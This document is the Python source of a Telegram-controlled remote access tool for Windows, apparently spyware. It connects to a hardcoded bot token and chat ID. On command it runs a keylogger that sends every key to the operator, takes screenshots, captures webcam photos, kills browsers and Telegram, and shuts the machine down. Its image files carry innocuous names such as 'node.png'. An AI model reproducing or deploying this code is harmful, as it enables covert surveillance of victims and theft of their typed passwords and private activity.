### import ###
import telepot
import os
import shutil
import psutil
import requests
import time
import json
import socket
import cv2
import sys
import pyautogui as p
from telepot.loop import MessageLoop
from pynput import keyboard as k
from telepot.namedtuple import ReplyKeyboardMarkup
from mss import mss
from transformers import pipeline, Conversation, AutoTokenizer
import warnings


### def ###
# telegram infos
def greenSquare():
    return u'\U00002705'
def redSquare():
    return u'\U0000274C'
def Id():
    return 123456789 # insert here your id
def Username():
    return "udername" # insert here your username
def botToken():
    return "5921040804:AAGbq7kWEkFpSi7BuaOxE0mqbaSeUNiGm6I" # do not change this id

# api
def notifyTelegramPoint():
    bot.sendMessage(Id(), 'Elon Muschio ON')

def waitForInternetConnection():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        pass
    return False
    
def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;

# functions
def keylogger():
    bot.sendMessage(Id(), '@@@ KEYLOGGER MODE ON @@@')
    def on_key_release(key):
        # print('Released Key %s' % key)
        bot.sendMessage(Id(), '%s' % key)
    with k.Listener(on_release = on_key_release) as listener:
        listener.join()

def killTelegram():
    if(telegramRunning()):
        os.system("taskkill /f /im Telegram.exe")

def telegramRunning():
    return checkIfProcessRunning("Telegram.exe")

def killBrave():
    if(braveRunning()):
        os.system("taskkill /f /im Brave.exe")

def braveRunning():
    return checkIfProcessRunning("Brave.exe")

def killGoogle():
    if(braveRunning()):
        os.system("taskkill /f /im Chrome.exe")

def googleRunning():
    return checkIfProcessRunning("Chrome.exe")

def killProgram():
    # bot.sendMessage(Id(), 'enter now the name of the program, please pay attention to capital letters and spaces:')
    textt = input("Insert here the target\n")
    def programRunning():
        return checkIfProcessRunning(program, ".exe")
    if(programRunning):
        program = ("taskkill /f /im ", textt, ".exe")
        programm = "".join(program)
        os.system(programm)

def pcRunning():
    return checkIfProcessRunning("svchost.exe")

def killAll():
    killTelegram()
    killBrave()
    killGoogle()

def updateUser():
    killTelegram()

    if(pcRunning()):
        bot.sendMessage(Id(), "Hi, Boss! I'm ON " + greenSquare())
    else:
        bot.sendMessage(Id(), "Sorry, someone has stopped me. Shutting down... " + redSquare())

def shutdownPc():
    os.system('shutdown -s -t 0')

def click():
    p.click()

def screenshot():
    with mss() as sct:
        file = sct.shot(mon=-1, output='bin\\Requests\\node.png')
    # time.sleep(2)
    bot.sendPhoto(Id(), photo = open('bin\\Requests\\node.png', 'rb'))

def sayCheese():
    cap = cv2.VideoCapture(0)
    ret,frame = cap.read()
    cv2.imwrite('bin\\Resources\\reqsts.png',frame)
    cv2.destroyAllWindows()
    cap.release()
    bot.sendPhoto(Id(), photo = open('bin\\Resources\\reqsts.png', 'rb'))

def closeCurrentApp():
    p.PAUSE=1
    p.hotkey("alt","f4")
    p.press('Return')


### MAIN ###
def handle(msg): #what to do if new message is received
    contentType, chatType, chatId = telepot.glance(msg)
    text = msg['text'].upper()
    

#    print(response_bot)

    
    if not (chatId == 737372475):
        bot.sendMessage(chatId, "You aren't my Patron. Go away!")
        bot.sendMessage(Id(), 'Someone contacted me! Here is the information:\n' + msg)
    elif(text == 'KILL ALL' or text == 'KA'):
        killAll()
        notifyTelegramPoint()
    elif(text == 'KILL PROGRAM' or text == 'KP'):
        killProgram()
        notifyTelegramPoint()
    elif(text == 'KILL BRAVE' or text == 'KB'):
        killBrave()
        notifyTelegramPoint()
    elif(text == 'UPDATE' or text == 'U'):
        updateUser()
    elif(text == 'KEYLOGGER' or text == 'KEY'):
        keylogger()
    elif(text == 'SCREENSHOT' or text == 'SCREEN'):
        screenshot()
    elif(text == 'CLICK' or text == 'C'):
        click()
    elif(text == 'CAM' or text == 'CAMERA'):
        sayCheese()
    elif(text == 'CLOSE APP' or text == 'CLOSEAPP'):
        closeCurrentApp()
    elif(text == '/START'):
        bot.sendMessage(Id(), "Welcome back, Boss", reply_markup=keyboard)
    elif(text == 'ELON OFF'or text == 'OFF'):
        bot.sendMessage(Id(), "Have a good day, Boss!")
        shutdownPc()

    else:
        
        warnings.filterwarnings("ignore")

        # chatbot
        tokenizer = AutoTokenizer.from_pretrained("microsoft/DialoGPT-medium", padding_side='left')
        generator = pipeline("conversational", model="microsoft/DialoGPT-medium")
        conversation = Conversation()
        conversation.add_user_input(text)
        fullconv = generator(conversation, pad_token_id=tokenizer.eos_token_id)
        response_bot = fullconv.generated_responses[-1]
        bot.sendMessage(chatId, response_bot)


### launching the bot ###
# time.sleep(1)
waitForInternetConnection()
bot = telepot.Bot(botToken())
MessageLoop(bot, handle).run_as_thread()
keyboard = ReplyKeyboardMarkup(keyboard=[['U', 'OFF'], ['KEY', 'SCREEN'], ['CAM', 'KA']])
bot.sendMessage(Id(), 'Hi Boss, I am ON now!', reply_markup=keyboard)
while 1:
    time.sleep(1)


